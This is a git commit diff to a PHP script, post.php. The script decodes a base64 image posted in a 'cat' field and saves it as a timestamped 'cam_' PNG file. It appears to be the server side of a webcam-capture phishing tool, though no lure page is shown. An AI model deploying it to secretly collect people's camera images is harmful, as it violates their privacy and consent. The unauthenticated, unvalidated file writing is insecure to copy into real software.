f538e14be19142c82b1a66fa60318371f83b7eb5
Shani kumar <amitandsuns@gmail.com>
2026-04-25 02:00:55 +0530

    Update post.php

--- post.php
+++ post.php
@@ -1,19 +1,29 @@
 <?php
 
-$date = date('dMYHis');
-$imageData=$_POST['cat'];
+$date = date('Y-m-d_H-i-s');
 
-if (!empty($_POST['cat'])) {
-error_log("Received" . "\r\n", 3, "Log.log");
+if(isset($_POST['cat']) && !empty($_POST['cat'])){
 
+    $imageData = $_POST['cat'];
+
+    // Base64 data clean
+    if (strpos($imageData, "base64,") !== false) {
+        $filteredData = explode("base64,", $imageData)[1];
+        $decodedData = base64_decode($filteredData);
+
+        // File name
+        $fileName = "cam_" . $date . ".png";
+
+        // Save image
+        file_put_contents($fileName, $decodedData);
+
+        echo "Image saved successfully";
+    } else {
+        echo "Invalid image data";
+    }
+
+} else {
+    echo "No data received";
 }
 
-$filteredData=substr($imageData, strpos($imageData, ",")+1);
-$unencodedData=base64_decode($filteredData);
-$fp = fopen( 'cam'.$date.'.png', 'wb' );
-fwrite( $fp, $unencodedData);
-fclose( $fp );
-
-exit();
 ?>
-
